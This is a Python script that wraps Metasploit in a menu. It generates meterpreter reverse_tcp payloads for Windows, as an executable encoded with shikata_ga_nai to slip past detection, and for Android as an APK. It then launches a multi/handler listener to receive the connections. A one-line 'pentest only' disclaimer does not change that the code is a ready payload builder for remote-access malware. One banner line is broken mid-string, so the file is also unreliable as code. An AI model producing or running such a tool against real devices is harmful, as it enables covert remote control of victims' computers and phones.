import subprocess
import time
import os
import socket

# CREATED TO VULNERABILITY AND PENTEST ENVIRONMENT ONLY

# GET LOCAL IP 
ip_address = ''
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    # Tenta conectar ao Google DNS para obter o endereço IP local
    s.connect(('8.8.8.8', 80))
    ip_address = s.getsockname()[0]
finally:
    s.close()

# INIT
def init():
	subprocess.run("clear", shell=True)
	print('         .-""""""-.')
	print('       _/_-~-~-~-_\\ENVIRONMENT ONLY
	
	print('      /~/_-~-~-~-_\\~\\')
	print('     / / /    / / / /')
	print('    / / /    / / / /')
	print('   / / /    / / / /')
	print('  / /_/____/ /_/ /')
	print(' /________/______/')
	print('      / / / /\\')
	print('     / / / / /\\')
	print('    / / / / / /\\')
	print('   / / /_/ / / /\\')
	print('  /_________/ /_/\\')
	print('  \\_________\\/\\_\\/\n')
	print("Use it carefully and pentest only.\n")
	print("Choose what you want to do.")
	print("1 - Create a Payload \n2 - Start Msfconsole\n3 - Extra Options\n4 - Exit")
	choice = input("> ")
	if choice == "1":
		venomCreate()
	elif choice == "2":
		msfStartNoOpt()
	elif choice == "3":
		print("\nExtra Options:")
		print("1 -  See Local IP")
		extra_choice = input("> ")
		if extra_choice == "1":
			print("\nYour Local IP is "+ip_address+"\n")
			print("Restart script? [y/n]")
			extra_choice_restart = input("> ")
			if extra_choice_restart == "y":
				init()
			elif extra_choice_restart == "n":
				print("Exiting script...")
				exit()
	elif choice == "4":
		print("\nExiting script...\n")
		exit()
	else:
		print("Invalid option! Restarting script...\n")
		time.sleep(2)
		init()



# CREATE VENOM

def venomCreate():
	print("\nSelect the OS:\n1 - Windows (meterpreter/reverse_tcp)\n2 - Android (meterpreter/reverse_tcp)")
	os = input("> ")
	print("\nSet the Host (Your Local IP is "+ip_address+"):")
	lhost = input("> ")
	print("\nSet the Port:")
	lport = input(">")
	print("\nSet Payload's name:")
	name = input("> ")

	if os == "1":
		payload = "windows/meterpreter/reverse_tcp"
		pl = "msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -e x86/shikata_ga_nai -i 3 -f exe -o {}.exe".format(lhost, lport, name)
		print("\nThe Payload will be generated...")
		subprocess.run(pl, shell=True)
		d = subprocess.run("pwd", shell=True, stdout=subprocess.PIPE)
		r = d.stdout.decode('utf-8')
		print("\nPayload saved at "+r+"/"+name+".exe\n")
		time.sleep(2)
		msfStart(lhost, lport, payload)
	elif os == "2":
		payload = "android/meterpreter/reverse_tcp"
		pl = "msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} -o {}.apk".format(lhost, lport, name)
		print("\nThe Payload will be generated...")
		subprocess.run(pl, shell=True)
		d = subprocess.run("pwd", shell=True, stdout=subprocess.PIPE)
		r = d.stdout.decode('utf-8')
		print("\nPayload saved at "+r+"/"+name+".apk\n")
		time.sleep(2)
		msfStart(lhost, lport, payload)
	else:
		print("Invalid.")
		init()
		


# START MSFCONSOLE
def msfStart(lhost, lport, payload):
	print("Initializate MsfConsole with configuration set? [y/n]")
	opt = input("> ")
	if opt == "y":
		msf_cmd = 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {}; set LHOST {}; set LPORT {}; run"'.format(payload, lhost, lport)
		subprocess.run(msf_cmd, shell=True)
	elif opt == "n":
		subprocess.run("clear", shell=True)
	else:
		msf_cmd = 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {}; set LHOST {}; set LPORT {}; run"'.format(payload, lhost, lport)
		subprocess.run(msf_cmd, shell=True)


def msfStartNoOpt():
	print("\nInitializating...")
	subprocess.run("msfconsole", shell=True)

init()	



